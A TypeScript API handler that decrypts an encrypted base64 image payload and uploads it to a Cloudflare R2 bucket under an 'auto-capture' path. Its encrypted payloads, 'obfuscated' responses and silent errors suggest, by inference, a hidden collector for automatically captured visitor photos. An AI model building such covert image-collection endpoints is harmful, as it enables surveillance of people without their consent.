import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';
import { decryptDataServer } from '../utils/crypto';

// Cloudflare R2 configuration
const s3Client = new S3Client({
  region: 'auto',
  endpoint: `https://${process.env.CLOUDFLARE_ACCOUNT_ID}.r2.cloudflarestorage.com`,
  credentials: {
    accessKeyId: process.env.CLOUDFLARE_R2_ACCESS_KEY_ID || '',
    secretAccessKey: process.env.CLOUDFLARE_R2_SECRET_ACCESS_KEY || '',
  },
});

const BUCKET_NAME = 'christmas-tree-photos';

// Helper function to compress and convert image to JPEG
async function compressImage(base64Data: string): Promise<Buffer> {
  // Remove data URL prefix if present
  const base64Image = base64Data.replace(/^data:image\/\w+;base64,/, '');
  return Buffer.from(base64Image, 'base64');
}

// Generate filename with timestamp
function generateFilename(): string {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  const milliseconds = String(now.getMilliseconds()).padStart(3, '0');
  
  return `auto-capture/${year}-${month}-${day}_${hours}-${minutes}-${seconds}-${milliseconds}.jpg`;
}

export default async function handler(req: any, res: any) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { payload } = req.body;

    if (!payload || typeof payload !== 'string') {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    // Decrypt payload
    const decrypted = decryptDataServer(payload);
    
    if (!decrypted || !decrypted.d) {
      return res.status(400).json({ error: 'Invalid data' });
    }

    const imageData = decrypted.d;

    // Convert base64 to buffer
    const imageBuffer = await compressImage(imageData);

    // Generate unique filename with timestamp
    const filename = generateFilename();

    // Upload to R2
    const command = new PutObjectCommand({
      Bucket: BUCKET_NAME,
      Key: filename,
      Body: imageBuffer,
      ContentType: 'image/jpeg',
      Metadata: {
        'capture-type': 'auto',
        'timestamp': new Date().toISOString(),
      },
    });

    await s3Client.send(command);

    // Return obfuscated success response
    return res.status(200).json({
      success: true,
      filename,
      timestamp: new Date().toISOString(),
    });
  } catch (error: any) {
    // Silent error - don't expose details
    return res.status(500).json({ 
      error: 'Processing failed'
    });
  }
}
